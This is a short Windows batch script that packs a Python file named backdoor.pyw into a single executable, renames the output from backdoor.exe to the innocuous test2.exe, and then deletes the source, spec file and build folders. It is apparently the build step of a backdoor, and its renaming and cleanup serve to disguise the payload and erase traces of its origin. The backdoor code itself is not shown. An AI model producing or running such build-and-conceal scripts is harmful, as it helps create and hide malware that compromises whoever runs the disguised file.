Convert.exe --onefile backdoor.pyw

cd dist
rename "backdoor.exe" test2.exe
cd ..


del backdoor.pyw
del backdoor.spec
RMDIR "build" /S /Q
RMDIR "__pycache__" /S /Q
exit
